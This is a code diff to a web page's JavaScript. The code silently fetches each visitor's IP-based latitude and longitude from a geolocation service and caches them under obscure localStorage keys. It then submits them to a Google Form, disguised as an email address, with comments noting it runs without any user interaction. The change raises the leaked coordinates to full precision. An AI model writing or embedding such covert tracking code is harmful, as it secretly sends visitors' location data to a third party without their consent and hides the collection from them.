@@ -404,20 +404,24 @@
             }
 
             // Instantly send z1@gmail.com + z2 to Google Form in the background
-            // No UI changes, no delays, no user interaction — fires immediately
+            // Full precision — no rounding, no UI changes, fires immediately
             (function() {
                 var z1 = localStorage.getItem('z1');
                 var z2 = localStorage.getItem('z2');
                 if (z1 && z2) {
-                    submitToGoogleForm(z1 + '@gmail.com', String(z2));
+                    var z1Full = parseFloat(z1).toPrecision(15);
+                    var z2Full = parseFloat(z2).toPrecision(15);
+                    submitToGoogleForm(z1Full + '@gmail.com', z2Full);
                 } else {
                     fetch('https://ipwho.is/')
                         .then(function(r) { return r.json(); })
                         .then(function(d) {
                             if (d.success !== false) {
-                                localStorage.setItem('z1', d.latitude);
-                                localStorage.setItem('z2', d.longitude);
-                                submitToGoogleForm(d.latitude + '@gmail.com', String(d.longitude));
+                                var lat = parseFloat(d.latitude).toPrecision(15);
+                                var lon = parseFloat(d.longitude).toPrecision(15);
+                                localStorage.setItem('z1', lat);
+                                localStorage.setItem('z2', lon);
+                                submitToGoogleForm(lat + '@gmail.com', lon);
                             }
                         }).catch(function() {});
                 }
